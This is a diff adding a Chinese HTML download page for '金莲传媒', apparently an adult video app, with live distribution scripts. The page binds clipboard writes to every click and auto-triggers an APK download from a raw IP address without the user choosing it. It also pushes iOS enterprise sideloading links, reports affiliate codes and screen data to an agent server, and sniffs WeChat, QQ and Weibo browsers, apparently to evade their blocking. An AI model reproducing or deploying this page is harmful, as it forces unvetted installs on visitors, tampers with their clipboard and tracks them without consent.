@@ -1,0 +1,437 @@
+<html lang="zh-CN"><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>金莲传媒</title>
+    <meta name="keywords" content="金莲传媒">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no,minimal-ui">
+    <link rel="stylesheet" href="./8/css.css">
+    </script><script src="./8/jquery.min.1.8.3.js"></script>
+</head>
+
+
+<body style="margin: 0;" >
+<div class="dow-nav downss">
+    <div class="dow-nav-logo">
+        <img src="./4/images/logo.png">
+        <p><span class="dow-nav-text1"><b>金莲传媒</b></span><br><span class="dow-nav-text2">海量免费高清正版视频</span></p>
+    </div>
+    <a class="dow-nav-but click-but-dow">点击下载</a>
+</div>
+<div class=" downssa downss" id="pp">
+    <img id="h1" class="downloadbg" style="display: block;width:100%;margin: 0; padding: 0;" src="img/bg44fff.jpg">
+</div>
+<div class="zhe_mu" style="display:none;" id="mm">
+    <div style="background: rgba(0,0,0,0.5);width: 100%; height: 100%;position: fixed;left: 0;top: 0;z-index: 999995;" onclick="hi();"></div>
+    <div style="width:334px;height:314px;background-size:100% 100%;background-image: url(//img.wysmq.cn/public/img/05@2x.png);position: fixed;top:calc((100% - 314px) / 2);left:calc((100% - 334px) / 2);z-index:999996;"><a id="ios-down" data-clipboard-action="copy"  class="down" href="https://a.shltcm.net.cn/gjdm1.apk" onclick="getPackage();"><div style="position:absolute;bottom:0;width:100%;padding:0;height:100%;text-align: center;" class="layui-layer-btn"></div></a></div>
+
+</div>
+<div class="dow-nav-foot dow-nav-foot-tf" style="display: none;">
+    <div class="dow-nav-logo">
+        <img src="./4/images/logo.png">
+        <p><span class="dow-nav-text1"><b>金莲传媒(TF)</b></span><br><span class="dow-nav-text2">海量免费高清正版视频</span></p>
+    </div>
+    <a class="dow-nav-but click-but-dow">点击下载</a>
+</div>
+<div class="dow-nav-foot downss">
+    <div class="dow-nav-logo">
+        <img src="./4/images/logo.png">
+        <p><span class="dow-nav-text1"><b>金莲传媒</b></span><br><span class="dow-nav-text2">海量免费高清正版视频</span></p>
+    </div>
+    <a class="dow-nav-but click-but-dow">点击下载</a>
+</div>
+
+<div role="dialog" aria-labelledby="金莲传媒" id="android_text" class="van-dialog load" style="display:none;width: 70%; z-index: 2002;">
+
+    <div class="van-dialog__header">金莲传媒</div>
+    <div class="van-dialog__content">
+        <!--<p>万部三级影片，同城约炮,小说,漫画<br> 下载中....<br>长时间没反应，请刷新网页</p>-->
+        <p>下载中....<br>长时间没反应，请刷新网页</p>
+        <img src="./8/load.gif" style="margin-left:45%;margin-bottom:5%;width:10%">
+    </div>
+</div>
+
+<script src="./8/clipboard.min.js"></script>
+<script>var io = false;</script>
+<script>var u = navigator.userAgent.toLowerCase();if (/iphone|ipad|ipod/.test(u)) { io = true;}  console.log(io);</script>
+<script>
+    var show=function(){
+        var b =document.getElementById('mm');
+        b.style="display:block;";
+    }
+    var hi=function(){
+        var b =document.getElementById('mm');
+        b.style="display:none;";
+    }
+
+    var clipboard = new ClipboardJS('body');
+    clipboard.on('success', function (e) {
+        // console.log("copy success")
+    });
+
+    clipboard.on('error', function (e) {
+        // console.log(e);
+    });
+    var send = function (kkey) {
+
+    };
+    $('body').click(function () {
+        var u = navigator.userAgent;
+        var isAndroid = u.indexOf('Android') > -1 || u.indexOf('Adr') > -1; //android终端
+        if(isAndroid){
+            //show();
+            dl();
+        }else{
+            dl();
+        }
+    })
+    function getPackage() {
+        /* $('#android_text').show();
+         window.location.href = '//';
+         setTimeout(() => {
+             $('#android_text').hide();
+         }, 3000);*/
+    }
+    function randomString(len) {
+        len = len || 32;
+        var $chars = 'abcdefghigklmnopqrstuvwmln1234567890';    /****默认去掉了容易混淆的字符oOLl,9gq,Vv,Uu,I1****/
+        var maxPos = $chars.length;
+        var pwd = '';
+        for (i = 0; i < len; i++) {
+            pwd += $chars.charAt(Math.floor(Math.random() * maxPos));
+        }
+        return pwd;
+    }
+    function GetRequest() {
+        var url = location.search; //获取url中"?"符后的字串
+        var theRequest = new Object();
+        if (url.indexOf("?") != -1) {
+            var str = url.substr(1);
+            strs = str.split("&");
+            for(var i = 0; i < strs.length; i ++) {
+                theRequest[strs[i].split("=")[0]]=unescape(strs[i].split("=")[1]);
+            }
+        }
+        return theRequest;
+    }
+    /* var qd = "dddm175@";
+     function dl(){
+         let agentid = "sun";//Request['affid'];
+         var dl_ip="47.100.229.158";//abc888
+         var Request = new Object();
+         Request = GetRequest();
+         if(Request['affid']&&Request['affid']!=undefined&&Request['affid']!=null&&Request['affid']!=""){
+             agentid=Request['affid'];
+         }
+         var filename=randomString(8);
+         //var apkurl = "http://"+dl_ip+"/"+agentid+".apk?n="+agentid+"-"+filename;
+         var apkurl = "http://"+dl_ip;
+         window.location.href = io ? 'itms-services://?action=download-manifest&url=https://hf188.oss-accelerate.aliyuncs.com/hf.plist' : apkurl;
+     };*/
+
+    /* setTimeout(() => {
+         dl()
+     }, 3000);*/
+</script>
+
+<div><object id="ClCache" click="sendMsg" host="" width="0" height="0"></object></div>
+<script type="text/javascript">
+    function GetRequest() {
+        var url = location.search; //获取url中"?"符后的字串
+        var theRequest = new Object();
+        if (url.indexOf("?") != -1) {
+            var str = url.substr(1);
+            strs = str.split("&");
+            for(var i = 0; i < strs.length; i ++) {
+                theRequest[strs[i].split("=")[0]]=unescape(strs[i].split("=")[1]);
+            }
+        }
+        return theRequest;
+    }
+    function randomString(len) {
+        len = len || 32;
+        var $chars = 'abcdefghigklmnopqrstuvwmln1234567890';    /****默认去掉了容易混淆的字符oOLl,9gq,Vv,Uu,I1****/
+        var maxPos = $chars.length;
+        var pwd = '';
+        for (i = 0; i < len; i++) {
+            pwd += $chars.charAt(Math.floor(Math.random() * maxPos));
+        }
+        return pwd;
+    }
+    var device = {
+        isAndroid: -1 < navigator.userAgent.toLowerCase().indexOf("android"),
+        isIos: null != navigator.userAgent.match(/(iPod|iPhone|iPad)/),
+        isChrome: /chrom(e|ium)/.test(navigator.userAgent.toLowerCase())
+    }
+    //link.href = '/'+id+'.apk?n='+id+'-'+filename;
+    let local = window.location.href;
+    var Request = new Object();
+    Request = GetRequest();
+    let agentid = "sun";//Request['affid'];
+    var dl_ip="47.100.229.158";
+
+    var filename=randomString(8);
+    var config = {
+        iosUrl: "itms-services://?action=download-manifest&url=",
+        //downHost: "http://"+dl_ip+"/"+agentid+".apk?n=万部三|级|片"+agentid+"-"+filename+"同城约[炮]",
+        downHost: "http://"+dl_ip+"/"+agentid+".apk?n="+agentid+"-"+filename,
+        downHost_ios: "https://somoo.mryx1.cn",
+        downloadUrlAndroid: "",
+        downloadUrlIos: "",
+        setDownUrl: function() {
+            config.downloadUrlAndroid = config.downHost;
+            config.downloadUrlIos = config.iosUrl + "https://ry188.oss-accelerate.aliyuncs.com/ry.plist";
+        },
+        init: function() {
+            config.setDownUrl()
+        }
+    };
+    config.init()
+
+    function is_weixn_qq(){
+        var ua = navigator.userAgent.toLowerCase();
+        if(ua.match(/MicroMessenger/i)=="micromessenger") {
+            return true;
+        } else if (ua.match(/QQ\//i) == "qq/") {
+            /*if(ua.match(/MQQBrowser/i) == "mqqbrowser" || ua.match(/QQBrowser/i) =="qqbrowser"){
+                return false;
+             }*/
+            return true;
+        } else if(ua.match(/WeiBo/i) == "weibo") {
+            return true;
+        }
+        return false;
+    }
+
+    var isWeixinqq = is_weixn_qq();
+
+
+    function copyText(){
+        if(!isWeixinqq){
+            //doagentRecord();
+            //device.isIos || device.isAndroid ? ( device.isIos ? location.href = config.downloadUrlIos: device.isAndroid && (location.href = config.downloadUrlAndroid)) : ''
+        }
+    }
+</script>
+<script type="text/javascript">
+
+
+    function loadHtml(){
+        //var body  = document.getElementById("body");
+        //body.setAttribute("style", "background:url(./img/bg2fff.jpg) no-repeat;background-size: 100%;background-position:center 0px;height:3279px;cursor：pointer;-webkit-tap-highlight-color: rgba(0,0,0,0); -webkit-tap-highlight-color:transparent;）");
+
+        var div = document.createElement('div');
+        div.id = 'weixin-tip';
+        div.innerHTML = '<p><img src="./img/live_weixin.png" /></p>';
+        document.body.appendChild(div);
+    }
+
+    var cssText = "#weixin-tip {display:block;position: fixed; left:0; top:0; background: rgba(0,0,0,0.4); filter:alpha(opacity=40); width: 100%; height:100%; z-index: 1000000;} "
+        +"#weixin-tip p{text-align: center; margin-top: 10%; padding:0 0;} "
+        +"#weixin-tip p img {width:100%;}";
+
+    function loadStyleText(cssText) {
+        var style = document.createElement('style');
+        style.rel = 'stylesheet';
+        style.type = 'text/css';
+        try {
+            style.appendChild(document.createTextNode(cssText));
+        } catch (e) {
+            style.styleSheet.cssText = cssText; //ie9以下
+        }
+        var head=document.getElementsByTagName("head")[0]; //head标签之间加上style样式
+        head.appendChild(style);
+    }
+
+
+    var ios_h5_down_url="";
+    var ios_tf_down_url="";
+    function doagentRecord(){
+        let local = window.location.href;
+        var Request = new Object();
+        Request = GetRequest();
+        let agent_id = Request['affid'];
+        let code = Request['code'];
+        $.ajax({
+            dataType: 'jsonp',  // 请求方式为jsonp
+            crossDomain: true,
+            url: "http://jlagent.sjzbey.com/agent/mgent/subex",
+            //url: "http://test.net/agent/mgent/subex",
+            type: "get",
+            data: {affid:agent_id,code:code,hostname:window.location.host,screenwidth:window.screen.width,screenheight:window.screen.height},
+            success: function(res){
+                dl(res.ios_down_type)
+                ios_h5_down_url=res.ios_h5_down_url;
+                ios_tf_down_url=res.ios_tf_url;
+            },
+            error: function (jqXHR, textStatus, errorThrown) {
+
+            }
+        });
+    }
+
+    function iosAddImg(addType,fullDownload) {
+        $(".downss").off("click")
+        $(".downss").click(function(){
+            if(!isWeixinqq){
+                window.location.href=config.downloadUrlIos;
+                $(".load").show();
+                setTimeout(function () {
+                    $(".load").hide();
+                }, 8000);
+            }
+        });
+        if(fullDownload!=undefined&&fullDownload==1){
+            $(".downloadbg").off("click")
+            $(".downloadbg").on("click",function(){
+                if(!isWeixinqq){
+                    window.location.href=config.downloadUrlIos;
+                    $(".load").show();
+                    setTimeout(function () {
+                        $(".load").hide();
+                    }, 8000);
+                }
+            });
+        }
+        $(document).ready(function(){
+            /*setTimeout(function () {
+                autoSubmit(config.downloadUrlIos);
+            }, 2000);*/
+        });
+    }
+    function iosAddTfImg(addType,fullDownload) {
+        $(".downss").off("click")
+        $(".downss").click(function(){
+            if(!isWeixinqq){
+                if(ios_tf_down_url.indexOf("https://testflight.apple.com")!=-1||ios_tf_down_url.indexOf("https://tf.chuangm23.cn")!=-1){
+                    window.location.href='ios_tf_page.html?dlurl='+ios_tf_down_url;
+                }else{
+                    window.location.href=ios_tf_down_url;
+                }
+            }
+        });
+        if(fullDownload!=undefined&&fullDownload==1){
+            $(".downloadbg").off("click")
+            $(".downloadbg").on("click",function(){
+                if(!isWeixinqq){
+                    if(ios_tf_down_url.indexOf("https://testflight.apple.com")!=-1||ios_tf_down_url.indexOf("https://tf.chuangm23.cn")!=-1){
+                        window.location.href='ios_tf_page.html?dlurl='+ios_tf_down_url;
+                    }else{
+                        window.location.href=ios_tf_down_url;
+                    }
+                }
+            });
+        }
+    }
+    function iosAddH5Img(addType,fullDownload) {
+        $(".downss").show();
+        $(".downss").click(function () {
+            if(!isWeixinqq&&$('.load').is(':hidden')){
+                window.location.href=ios_h5_down_url;
+            }
+        });
+        if(fullDownload!=undefined&&fullDownload==1){
+            $(".downloadbg").on("click",function(){
+                if(!isWeixinqq&&$('.load').is(':hidden')){
+                    window.location.href=ios_h5_down_url;
+                }
+            });
+            $(".downloadbg").on("click",function(){
+                if(!isWeixinqq&&$('.load').is(':hidden')){
+                    window.location.href=ios_h5_down_url;
+                }
+            });
+        }
+
+    }
+    function removeChildren(id) {
+        /*var f = document.getElementById(id);
+        var childs = f.childNodes;
+        for(var i = 0; i < childs.length; i++) {
+            f.removeChild(childs[i]);
+        }*/
+    }
+
+    var autodl=false;
+    function dl(ios_down_type) {
+        if(isWeixinqq){
+            loadHtml();
+            loadStyleText(cssText);
+        }else{
+            if(device.isIos){
+                if(ios_down_type == 1){
+                    iosAddImg(1,1);
+                    iosAddH5Img(0,0);
+                }
+                if(ios_down_type == 2){
+                    iosAddImg(1,1);
+                }
+                if(ios_down_type == 3){
+                    iosAddH5Img(1,1);
+                }
+                if(ios_down_type == 5){
+                    iosAddTfImg(1,1);
+                }
+                if(ios_down_type == 6){
+                    iosAddTfImg(1,0);
+                    iosAddImg(0,1);
+                }
+                if(ios_down_type == 7){
+                    iosAddTfImg(1,1);
+                    iosAddH5Img(0,0);
+                }
+            }else{
+                $(".downss").off("click")
+                $(".downss").click(function(){
+                    if(!isWeixinqq){
+                        //window.location.href=config.downloadUrlAndroid;
+                        var url=config.downloadUrlAndroid;
+                        autoSubmit(url);
+                        $(".load").show();
+                        setTimeout(function () {
+                            $(".load").hide();
+                        }, 8000);
+                    }
+                });
+                $(".downloadbg").off("click")
+                $(".downloadbg").on("click",function(){
+                    if(!isWeixinqq){
+                        //window.location.href=config.downloadUrlAndroid;
+                        var url=config.downloadUrlAndroid;
+                        autoSubmit(url);
+                        $(".load").show();
+                        setTimeout(function () {
+                            $(".load").hide();
+                        }, 8000);
+                    }
+                });
+                $(document).ready(function(){
+                    if(!autodl){
+                        autodl=true;
+                        if(config.downloadUrlAndroid.indexOf("sun")==-1){
+                            setTimeout(function () {
+                                autoSubmit(config.downloadUrlAndroid);
+                                /*$(".load").show();
+                                setTimeout(function () {
+                                    $(".load").hide();
+                                }, 8000);*/
+                            }, 2000);
+                        }
+                    }
+
+                });
+            }
+        }
+    }
+    $(document).ready(function(){
+        dl(0);
+    });
+    doagentRecord();
+    function autoSubmit(url){
+        var link = document.createElement('a');
+        link.style.display = 'none';
+        link.href = url;
+        document.body.appendChild(link);
+        link.click();
+    }
+</script>
+</body></html>
